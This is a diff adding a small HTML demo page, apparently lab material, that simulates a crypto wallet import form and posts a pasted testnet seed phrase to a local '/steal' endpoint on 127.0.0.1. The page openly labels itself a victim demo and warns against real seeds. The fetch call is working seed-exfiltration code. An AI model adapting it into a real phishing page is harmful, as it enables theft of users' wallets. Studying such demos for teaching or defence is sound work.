@@ -1,0 +1,31 @@
+﻿<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Victim import demo</title></head>
+<body>
+  <h3>Simulated Import Page (DO NOT PASTE REAL SEEDS)</h3>
+  <textarea id="secret" rows="3" cols="60" placeholder="Paste Sepolia seed here..."></textarea><br/>
+  <button id="send">Send seed to attacker (local)</button>
+  <p id="log"></p>
+
+  <script>
+    document.getElementById('send').addEventListener('click', async () => {
+      const secret = document.getElementById('secret').value.trim();
+      if (!secret) { alert('Paste a seed'); return; }
+      document.getElementById('log').innerText = 'Posting secret to attacker...';
+      try {
+        const start = Date.now();
+        const resp = await fetch('http://127.0.0.1:3000/steal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ secret })
+        });
+        const json = await resp.json();
+        const elapsed = Date.now() - start;
+        document.getElementById('log').innerText = 'Response: ' + JSON.stringify(json) + ' (roundtrip ' + elapsed + 'ms)';
+      } catch (err) {
+        document.getElementById('log').innerText = 'Error contacting attacker server. Is it running?';
+      }
+    });
+  </script>
+</body>
+</html>
